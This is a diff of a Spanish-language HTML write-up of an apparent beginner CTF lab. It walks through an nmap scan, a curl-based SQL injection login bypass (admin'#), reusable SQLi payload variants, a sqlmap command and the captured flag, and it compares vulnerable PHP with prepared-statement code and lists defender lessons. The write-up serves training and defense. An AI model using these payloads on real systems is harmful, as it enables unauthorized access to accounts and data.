-          <span class="curl-token cmd-t">curl</span>
-          <span class="curl-explain-small">cliente HTTP de terminal</span>
-        </div>
-        <div class="curl-part-item">
-          <span class="curl-token flag-t">-s</span>
-          <span class="curl-explain-small">silent: sin barra de progreso</span>
-        </div>
-        <div class="curl-part-item">
-          <span class="curl-token flag-t">-X POST</span>
-          <span class="curl-explain-small">método HTTP POST (el form usa POST)</span>
-        </div>
-        <div class="curl-part-item">
-          <span class="curl-token url-t">http://10.129.18.216/</span>
-          <span class="curl-explain-small">URL destino (action del form)</span>
-        </div>
-        <div class="curl-part-item">
-          <span class="curl-token flag-t">-d</span>
-          <span class="curl-explain-small">datos del body de la petición</span>
-        </div>
-      </div>
-      <div class="curl-payload">
-        <span class="curl-payload-token">"username=admin'%23&amp;password=anything"</span>
-        <div class="curl-payload-explain">
-          <strong>admin</strong> → nombre de usuario objetivo<br>
-          <strong style="color:var(--red);">'</strong> → cierra el string SQL (¡el carácter mágico!)<br>
-          <strong style="color:var(--red);">%23</strong> → URL encoding de <strong>#</strong> (ASCII 35 = hex 23). El # es el comentario de línea en MySQL. Las comillas del shell interpretarían # como comentario bash si no se URL-encode.<br>
-          <strong>password=anything</strong> → cualquier valor — el comentario # hace que el servidor lo ignore completamente
-        </div>
-      </div>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Nmap — Descubrir Apache con formulario de login</h2></div>
+      
+
+<div class="why-box">
+<strong>¿Por qué nmap directamente?</strong>
+<p>Combinamos ping + nmap en este paso. El output de <code>-sC</code> en HTTP incluye el título de la página — si dice "Login", hay un formulario de autenticación que potencialmente es vulnerable a SQLi.</p>
+</div>
+
+
+<div class="cmd-annotated">
+<div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p80</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="flag-opt">-n</span> <span class="ip">10.129.18.216</span></div>
+<div class="cmd-notes">
+<div class="cmd-note"><code>-p80</code> → solo el puerto 80 (HTTP). Un escaneo previo confirmó que es el único puerto.</div>
+<div class="cmd-note"><code>-sC</code> → scripts NSE por defecto. Para HTTP: <code>http-title</code> (extrae el título de la página), <code>http-server-header</code> (versión del servidor).</div>
+<div class="cmd-note"><code>-sV</code> → versión exacta del servidor web</div>
+<div class="cmd-note"><code>-n</code> → sin resolución DNS</div>
+</div>
+</div>
+
+
+<div class="output-box">
+<div class="output-label">Output</div>
+<pre>PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Login</pre>
+</div>
+
+
+<div class="interpret-box">
+<strong>¿Qué nos dice cada línea?</strong>
+<ul>
+<li><code>Apache httpd 2.4.38 (Debian)</code> → versión específica de Apache en Debian (→ PHP como backend → MySQL como DB → vulnerable a SQLi con <code>#</code>)</li>
+<li><code>http-title: Login</code> → <strong>CLAVE</strong>: el título de la página es "Login" — hay un formulario de autenticación que es nuestro vector</li>
+</ul>
+</div>
+
+
+<div class="decision-box"><strong>Decisión tomada</strong><p>Formulario de login en Apache+PHP. Stack Apache+Debian = MySQL como backend. Intentar directamente SQLi con payload <code>admin'#</code> (comentario MySQL).</p></div>
+
+
     </div>
 
-    <div class="output-box">
-      <div class="output-label">Output</div>
-      <pre>&lt;div class="alert alert-success"&gt;
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación — Paso a Paso</h2></div>
+      
+
+<div class="step-box">
+<div class="step-number">Paso 2 — Explotación (EL ATAQUE)</div>
+<h3>SQL Injection Login Bypass con curl POST</h3>
+<div class="why-box">
+<strong>¿Por qué curl y no el navegador?</strong>
+<p>curl permite hacer peticiones HTTP desde la línea de comandos de forma scriptable, reproducible y sin interfaz gráfica. Perfecto para probar payloads de forma rápida y automatizable. <code>-X POST</code> y <code>-d</code> replican exactamente lo que haría un navegador al enviar el formulario.</p>
+</div>
+<!-- CURL BREAKDOWN -->
+<div class="curl-breakdown">
+<div class="output-label">Disección del comando curl</div>
+<div class="curl-parts-top">
+<div class="curl-part-item">
+<span class="curl-token cmd-t">curl</span>
+<span class="curl-explain-small">cliente HTTP de terminal</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token flag-t">-s</span>
+<span class="curl-explain-small">silent: sin barra de progreso</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token flag-t">-X POST</span>
+<span class="curl-explain-small">método HTTP POST (el form usa POST)</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token url-t">http://10.129.18.216/</span>
+<span class="curl-explain-small">URL destino (action del form)</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token flag-t">-d</span>
+<span class="curl-explain-small">datos del body de la petición</span>
+</div>
+</div>
+<div class="curl-payload">
+<span class="curl-payload-token">"username=admin'%23&amp;password=anything"</span>
+<div class="curl-payload-explain">
+<strong>admin</strong> → nombre de usuario objetivo<br/>
+<strong style="color:var(--red);">'</strong> → cierra el string SQL (¡el carácter mágico!)<br/>
+<strong style="color:var(--red);">%23</strong> → URL encoding de <strong>#</strong> (ASCII 35 = hex 23). El # es el comentario de línea en MySQL. Las comillas del shell interpretarían # como comentario bash si no se URL-encode.<br/>
+<strong>password=anything</strong> → cualquier valor — el comentario # hace que el servidor lo ignore completamente
+        </div>
+</div>
+</div>
+<div class="output-box">
+<div class="output-label">Output</div>
+<pre>&lt;div class="alert alert-success"&gt;
   Welcome admin! Here's your flag: e3d0796d002a446c0e622226f42e9672
 &lt;/div&gt;</pre>
-    </div>
-    <div class="interpret-box">
-      <strong>¿Qué nos dice este output?</strong>
-      <ul>
-        <li>El servidor autenticó exitosamente como <code>admin</code></li>
-        <li>La flag aparece en el dashboard: <code>e3d0796d002a446c0e622226f42e9672</code></li>
-        <li>El login bypass funcionó exactamente como predicho por Ghost-Ops</li>
-      </ul>
-    </div>
-  </div>
+</div>
+<div class="interpret-box">
+<strong>¿Qué nos dice este output?</strong>
+<ul>
+<li>El servidor autenticó exitosamente como <code>admin</code></li>
+<li>La flag aparece en el dashboard: <code>e3d0796d002a446c0e622226f42e9672</code></li>
+<li>El login bypass funcionó exactamente como predicho por Ghost-Ops</li>
+</ul>
+</div>
 </div>
 
-<!-- SQLI VISUALIZER -->
-<div class="section">
-  <h2>Anatomía del SQL Injection — Visualización</h2>
-  <div class="sqli-box">
-    <div class="sqli-row">
-      <span class="sqli-label">Normal:</span>
-      <div class="sqli-query">
-        <span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> users <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span> <span class="q-keyword">AND</span> password=<span class="q-string">'secreto'</span>
-      </div>
+
     </div>
-    <hr class="sqli-divider">
-    <div class="sqli-row">
-      <span class="sqli-label">Con payload:</span>
-      <div class="sqli-query">
-        <span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> users <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span><span class="q-inject">'</span><span class="q-comment">#' AND password='anything'</span>
-      </div>
-    </div>
-    <hr class="sqli-divider">
-    <div class="sqli-row">
-      <span class="sqli-label">Efectiva:</span>
-      <div class="sqli-query">
-        <span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> users <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span><span class="q-result"> ← devuelve admin sin verificar password ✓</span>
-      </div>
-    </div>
-  </div>
-  <div class="info-box">
-    <p><strong>¿Por qué funciona?</strong> El carácter <code>#</code> es el delimitador de comentario de línea en MySQL. Todo lo que viene después de <code>#</code> es ignorado por el intérprete SQL. La query efectiva solo verifica que el usuario "admin" exista — sin importar la contraseña.</p>
-  </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>SQL Injection Login Bypass con curl POST</h2></div>
+      
+
+<div class="why-box">
+<strong>¿Por qué curl y no el navegador?</strong>
+<p>curl permite hacer peticiones HTTP desde la línea de comandos de forma scriptable, reproducible y sin interfaz gráfica. Perfecto para probar payloads de forma rápida y automatizable. <code>-X POST</code> y <code>-d</code> replican exactamente lo que haría un navegador al enviar el formulario.</p>
 </div>
 
-<!-- CODE COMPARE -->
-<div class="section">
-  <h2>Código Vulnerable vs Código Seguro</h2>
-  <div class="code-compare">
-    <div class="vuln-code">
-      <div class="code-header">❌ Código PHP Vulnerable</div>
-      <div class="code-box">
-        <pre>$username = $_POST['username'];
+
+ CURL BREAKDOWN 
+
+
+<div class="curl-breakdown">
+<div class="output-label">Disección del comando curl</div>
+<div class="curl-parts-top">
+<div class="curl-part-item">
+<span class="curl-token cmd-t">curl</span>
+<span class="curl-explain-small">cliente HTTP de terminal</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token flag-t">-s</span>
+<span class="curl-explain-small">silent: sin barra de progreso</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token flag-t">-X POST</span>
+<span class="curl-explain-small">método HTTP POST (el form usa POST)</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token url-t">http://10.129.18.216/</span>
+<span class="curl-explain-small">URL destino (action del form)</span>
+</div>
+<div class="curl-part-item">
+<span class="curl-token flag-t">-d</span>
+<span class="curl-explain-small">datos del body de la petición</span>
+</div>
+</div>
+<div class="curl-payload">
+<span class="curl-payload-token">"username=admin'%23&amp;password=anything"</span>
+<div class="curl-payload-explain">
+<strong>admin</strong> → nombre de usuario objetivo<br/>
+<strong style="color:var(--red);">'</strong> → cierra el string SQL (¡el carácter mágico!)<br/>
+<strong style="color:var(--red);">%23</strong> → URL encoding de <strong>#</strong> (ASCII 35 = hex 23). El # es el comentario de línea en MySQL. Las comillas del shell interpretarían # como comentario bash si no se URL-encode.<br/>
+<strong>password=anything</strong> → cualquier valor — el comentario # hace que el servidor lo ignore completamente
+        </div>
+</div>
+</div>
+
+
+<div class="output-box">
+<div class="output-label">Output</div>
+<pre>&lt;div class="alert alert-success"&gt;
+  Welcome admin! Here's your flag: e3d0796d002a446c0e622226f42e9672
+&lt;/div&gt;</pre>
+</div>
+
+
+<div class="interpret-box">
+<strong>¿Qué nos dice este output?</strong>
+<ul>
+<li>El servidor autenticó exitosamente como <code>admin</code></li>
+<li>La flag aparece en el dashboard: <code>e3d0796d002a446c0e622226f42e9672</code></li>
+<li>El login bypass funcionó exactamente como predicho por Ghost-Ops</li>
+</ul>
+</div>
+
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Anatomía del SQL Injection — Visualización</h2></div>
+      
+
+<div class="sqli-box">
+<div class="sqli-row">
+<span class="sqli-label">Normal:</span>
+<div class="sqli-query">
+<span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> users <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span> <span class="q-keyword">AND</span> password=<span class="q-string">'secreto'</span>
+</div>
+</div>
+<hr class="sqli-divider"/>
+<div class="sqli-row">
+<span class="sqli-label">Con payload:</span>
+<div class="sqli-query">
+<span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> users <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span><span class="q-inject">'</span><span class="q-comment">#' AND password='anything'</span>
+</div>
+</div>
+<hr class="sqli-divider"/>
+<div class="sqli-row">
+<span class="sqli-label">Efectiva:</span>
+<div class="sqli-query">
+<span class="q-keyword">SELECT</span> * <span class="q-keyword">FROM</span> users <span class="q-keyword">WHERE</span> username=<span class="q-string">'admin'</span><span class="q-result"> ← devuelve admin sin verificar password ✓</span>
+</div>
+</div>
+</div>
+
+
+<div class="info-box">
+<p><strong>¿Por qué funciona?</strong> El carácter <code>#</code> es el delimitador de comentario de línea en MySQL. Todo lo que viene después de <code>#</code> es ignorado por el intérprete SQL. La query efectiva solo verifica que el usuario "admin" exista — sin importar la contraseña.</p>
+</div>
+
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Código Vulnerable vs Código Seguro</h2></div>
+      
+
+<div class="code-compare">
+<div class="vuln-code">
+<div class="code-header">❌ Código PHP Vulnerable</div>
+<div class="code-box">
+<pre>$username = $_POST['username'];
 $password = $_POST['password'];
 
 $query = "SELECT * FROM users
   WHERE username='$username'
   AND password='$password'";</pre>
-      </div>
-      <p class="code-note">El input del usuario se concatena directamente en la query SQL. Cualquier carácter SQL en el input modifica la lógica de la query.</p>
-    </div>
-    <div class="safe-code">
-      <div class="code-header">✅ Código Seguro — Prepared Statements</div>
-      <div class="code-box">
-        <pre>$stmt = $pdo->prepare(
+</div>
+<p class="code-note">El input del usuario se concatena directamente en la query SQL. Cualquier carácter SQL en el input modifica la lógica de la query.</p>
+</div>
+<div class="safe-code">
+<div class="code-header">✅ Código Seguro — Prepared Statements</div>
+<div class="code-box">
+<pre>$stmt = $pdo-&gt;prepare(
   "SELECT * FROM users
   WHERE username = ?
   AND password = ?");
 
-$stmt->execute([$user, $pass]);</pre>
+$stmt-&gt;execute([$user, $pass]);</pre>
+</div>
+<p class="code-note">Los <code>?</code> son placeholders. PDO envía la query y los valores <strong>por separado</strong>. El motor SQL los trata como datos, nunca como código.</p>
+</div>
+</div>
+
+
+<div class="info-box">
+<p><strong>Analogía:</strong> Con prepared statements es como darle a alguien un formulario con espacios en blanco — no puede alterar la estructura del documento, solo llenar los espacios asignados. Sin ellos, es como dejarle escribir el documento completo.</p>
+</div>
+
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Variantes del Ataque — Diferentes Payloads SQLi</h2></div>
+      
+
+<table class="payloads-table">
+<tr><th>Payload username</th><th>Backend</th><th>Explicación</th></tr>
+<tr class="highlight-row"><td><code>admin'#</code></td><td>MySQL</td><td># comenta hasta fin de línea — el más común en MySQL</td></tr>
+<tr><td><code>admin'--</code></td><td>SQL Server / PostgreSQL</td><td>-- comentario estándar SQL, funciona en múltiples backends</td></tr>
+<tr><td><code>admin'-- -</code></td><td>MySQL variante</td><td>El espacio después del -- es necesario en algunos contextos</td></tr>
+<tr><td><code>' OR '1'='1</code></td><td>Universal</td><td>Siempre true — accede como el primer usuario en la tabla</td></tr>
+<tr><td><code>' OR 1=1--</code></td><td>Universal</td><td>Siempre true con comentario estándar</td></tr>
+</table>
+
+
+<div class="info-box">
+<p><strong>¿Por qué usamos # y no -- ?</strong> El stack Apache+Debian con PHP típicamente usa MySQL, y <code>#</code> es el comentario de línea nativo de MySQL. <code>--</code> también funciona en MySQL pero requiere un espacio después (<code>-- </code>), lo que puede complicarse en URL encoding.</p>
+</div>
+
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Lecciones Aprendidas</h2></div>
+      
+
+<div class="lessons-grid">
+<div class="lesson-card attacker">
+<h4>⚔ Para el Atacante</h4>
+<ul>
+<li>Apache+PHP+MySQL → siempre probar SQLi en formularios de login</li>
+<li>Payload básico: <code>admin'#</code> — 90% de éxito en MySQL sin WAF</li>
+<li><code>%23</code> = URL encoding de <code>#</code> para evitar interpretación bash</li>
+<li>Si manual falla: <code>sqlmap -u URL --data="user=a&amp;pass=b" --dbs</code></li>
+<li>Nmap -sC revela el título "Login" → señal de formulario objetivo</li>
+</ul>
+</div>
+<div class="lesson-card defender">
+<h4>🛡 Para el Defensor</h4>
+<ul>
+<li>Usar Prepared Statements siempre — es el fix definitivo</li>
+<li>Validar y sanitizar inputs (rechazo de caracteres SQL)</li>
+<li>WAF: ModSecurity detecta <code>'</code> y <code>#</code> en campos de login</li>
+<li>Nunca mostrar errores SQL al usuario (revelan estructura DB)</li>
+<li>Principio de mínimo privilegio: el usuario DB solo necesita SELECT</li>
+</ul>
+</div>
+</div>
+
+
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&CK</h2></div>
+      
+
+<table class="data-table">
+<tr><th>ID</th><th>Técnica</th><th>Descripción</th></tr>
+<tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap descubriendo Apache en puerto 80</td></tr>
+<tr><td><code>T1190</code></td><td>Exploit Public-Facing App</td><td>SQL Injection en formulario de login web</td></tr>
+<tr><td><code>T1110.001</code></td><td>Brute Force: Password Guessing</td><td>Bypass de autenticación vía SQLi</td></tr>
+<tr><td><code>T1078</code></td><td>Valid Accounts</td><td>Acceso como admin mediante bypass</td></tr>
+<tr><td><code>T1005</code></td><td>Data from Local System</td><td>Extracción de flag del dashboard web</td></tr>
+</table>
+
+
+    </div>
+
+  </div>
+
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">VERY EASY</span></div>
+      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
+      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.X.X</span></div>
+      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Starting Point</span></div>
+      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">SQLi Login Bypass</span></div>
+      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">SQL Injection</span><span class="skill-pct">92%</span></div><div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Web Enumeration</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Herramientas</h3>
+      <div class="tools-list">
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">gobuster</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">curl</span></div>
       </div>
-      <p class="code-note">Los <code>?</code> son placeholders. PDO envía la query y los valores <strong>por separado</strong>. El motor SQL los trata como datos, nunca como código.</p>
-    </div>
-  </div>
-  <div class="info-box">
-    <p><strong>Analogía:</strong> Con prepared statements es como darle a alguien un formulario con espacios en blanco — no puede alterar la estructura del documento, solo llenar los espacios asignados. Sin ellos, es como dejarle escribir el documento completo.</p>
-  </div>
-</div>
-
-<!-- PAYLOADS TABLE -->
-<div class="section">
-  <h2>Variantes del Ataque — Diferentes Payloads SQLi</h2>
-  <table class="payloads-table">
-    <tr><th>Payload username</th><th>Backend</th><th>Explicación</th></tr>
-    <tr class="highlight-row"><td><code>admin'#</code></td><td>MySQL</td><td># comenta hasta fin de línea — el más común en MySQL</td></tr>
-    <tr><td><code>admin'--</code></td><td>SQL Server / PostgreSQL</td><td>-- comentario estándar SQL, funciona en múltiples backends</td></tr>
-    <tr><td><code>admin'-- -</code></td><td>MySQL variante</td><td>El espacio después del -- es necesario en algunos contextos</td></tr>
-    <tr><td><code>' OR '1'='1</code></td><td>Universal</td><td>Siempre true — accede como el primer usuario en la tabla</td></tr>
-    <tr><td><code>' OR 1=1--</code></td><td>Universal</td><td>Siempre true con comentario estándar</td></tr>
-  </table>
-  <div class="info-box">
-    <p><strong>¿Por qué usamos # y no -- ?</strong> El stack Apache+Debian con PHP típicamente usa MySQL, y <code>#</code> es el comentario de línea nativo de MySQL. <code>--</code> también funciona en MySQL pero requiere un espacio después (<code>-- </code>), lo que puede complicarse en URL encoding.</p>
-  </div>
-</div>
-
-<div class="section">
-  <h2>Lecciones Aprendidas</h2>
-  <div class="lessons-grid">
-    <div class="lesson-card attacker">
-      <h4>⚔ Para el Atacante</h4>
-      <ul>
-        <li>Apache+PHP+MySQL → siempre probar SQLi en formularios de login</li>
-        <li>Payload básico: <code>admin'#</code> — 90% de éxito en MySQL sin WAF</li>
-        <li><code>%23</code> = URL encoding de <code>#</code> para evitar interpretación bash</li>
-        <li>Si manual falla: <code>sqlmap -u URL --data="user=a&pass=b" --dbs</code></li>
-        <li>Nmap -sC revela el título "Login" → señal de formulario objetivo</li>
-      </ul>
-    </div>
-    <div class="lesson-card defender">
-      <h4>🛡 Para el Defensor</h4>
-      <ul>
-        <li>Usar Prepared Statements siempre — es el fix definitivo</li>
-        <li>Validar y sanitizar inputs (rechazo de caracteres SQL)</li>
-        <li>WAF: ModSecurity detecta <code>'</code> y <code>#</code> en campos de login</li>
-        <li>Nunca mostrar errores SQL al usuario (revelan estructura DB)</li>
-        <li>Principio de mínimo privilegio: el usuario DB solo necesita SELECT</li>
-      </ul>
     </div>
   </div>
 </div>
 
-<div class="section">
-  <h2>MITRE ATT&amp;CK</h2>
-  <table class="data-table">
-    <tr><th>ID</th><th>Técnica</th><th>Descripción</th></tr>
-    <tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap descubriendo Apache en puerto 80</td></tr>
-    <tr><td><code>T1190</code></td><td>Exploit Public-Facing App</td><td>SQL Injection en formulario de login web</td></tr>
-    <tr><td><code>T1110.001</code></td><td>Brute Force: Password Guessing</td><td>Bypass de autenticación vía SQLi</td></tr>
-    <tr><td><code>T1078</code></td><td>Valid Accounts</td><td>Acceso como admin mediante bypass</td></tr>
-    <tr><td><code>T1005</code></td><td>Data from Local System</td><td>Extracción de flag del dashboard web</td></tr>
-  </table>
-</div>
-
-<div class="flag-box">
-  <div class="flag-label">Flag</div>
-  <div class="flag-value">e3d0796d002a446c0e622226f42e9672</div>
-  <p style="color:var(--text-muted);font-size:.8rem;margin-top:.75rem;">Dashboard: http://10.129.18.216/ (post-login como admin)</p>
-</div>
-
-</main>
-<aside class="sidebar">
-  <div class="sidebar-card">
-    <h4>Ficha Técnica</h4>
-    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.18.216</span></div>
-    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux Debian</span></div>
-    <div class="meta-row"><span class="meta-label">Puerto</span><span class="meta-value">80/tcp</span></div>
-    <div class="meta-row"><span class="meta-label">Server</span><span class="meta-value">Apache 2.4.38</span></div>
-    <div class="meta-row"><span class="meta-label">Vector</span><span class="meta-value">SQLi admin'#</span></div>
-    <div class="meta-row"><span class="meta-label">Tiempo</span><span class="meta-value">~2 min</span></div>
-    <div class="meta-row"><span class="meta-label">Comandos</span><span class="meta-value">2</span></div>
-  </div>
-  <div class="sidebar-card">
-    <h4>MITRE ATT&amp;CK</h4>
-    <span class="mitre-tag">T1046</span><span class="mitre-tag">T1190</span>
-    <span class="mitre-tag">T1110.001</span><span class="mitre-tag">T1078</span>
-    <span class="mitre-tag">T1005</span>
-  </div>
-  <div class="sidebar-card">
-    <h4>Ghost-Ops Score</h4>
-    <div class="score-num">5/5</div>
-    <div class="score-label">predicciones correctas ✅</div>
-    <div class="record-badge">⚡ 2 comandos — récord absoluto</div>
-  </div>
-  <div class="sidebar-card">
-    <h4>OWASP Reference</h4>
-    <div class="owasp-badge">A03:2021 — Injection</div>
-    <p style="font-size:.78rem;color:var(--text-dim);margin-top:.5rem;">SQL Injection figura en OWASP Top 10 desde 2003. Una de las vulnerabilidades más antiguas y comunes.</p>
-  </div>
-  <div class="sidebar-card">
-    <h4>Glosario Rápido</h4>
-    <div class="glosario-item"><span class="glosario-term">SQL Injection</span><span class="glosario-def">Input del usuario interpretado como código SQL</span></div>
-    <div class="glosario-item"><span class="glosario-term"># (MySQL)</span><span class="glosario-def">Comentario de línea en MySQL — ignora todo lo que le sigue</span></div>
-    <div class="glosario-item"><span class="glosario-term">%23</span><span class="glosario-def">URL encoding del carácter # (ASCII 35 = hex 23)</span></div>
-    <div class="glosario-item"><span class="glosario-term">Prepared Stmt</span><span class="glosario-def">Técnica que separa código SQL de datos — previene SQLi</span></div>
-    <div class="glosario-item"><span class="glosario-term">curl -X POST</span><span class="glosario-def">Enviar petición HTTP POST desde la terminal</span></div>
-    <div class="glosario-item"><span class="glosario-term">OWASP Top 10</span><span class="glosario-def">Lista anual de las 10 vulnerabilidades web más críticas</span></div>
-  </div>
-</aside>
-</div>
+<script>
+  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
+  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
+  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
+  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
+  setInterval(drawMatrix,35);
+</script>
 </body>
 </html>
